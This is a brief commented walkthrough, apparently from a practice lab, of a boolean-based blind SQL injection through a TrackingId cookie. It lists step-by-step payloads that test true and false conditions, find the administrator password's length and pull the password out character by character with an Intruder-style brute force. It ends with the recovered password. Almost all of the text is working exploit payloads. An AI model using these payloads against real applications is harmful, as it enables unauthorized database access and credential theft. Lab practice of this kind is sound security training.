/*

1) GET /login HTTP/2
//displays "Welcome back!" message if the trackingId is valid

2) Cookie: TrackingId=2kw2E2C5CPST1Ec8' AND '1'='2;
//false

3) Cookie: TrackingId=2kw2E2C5CPST1Ec8' AND '1'='1;
//true

4) Cookie: TrackingId=2kw2E2C5CPST1Ec8' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username = 'administrator')='4;
//true
//4

5) Cookie: TrackingId=2kw2E2C5CPST1Ec8' AND (SELECT 'a' FROM users WHERE username = 'administrator' AND LENGTH(password) =20 )='a'--;
//find out the length of the password

6) Cookie: TrackingId=2kw2E2C5CPST1Ec8' AND (SELECT SUBSTRING(password,§§,1) FROM users WHERE username='administrator')='§§'--;
//Intruder 1-20; a-z,0-9

7) 4oh40122w0e6salmcr14


*/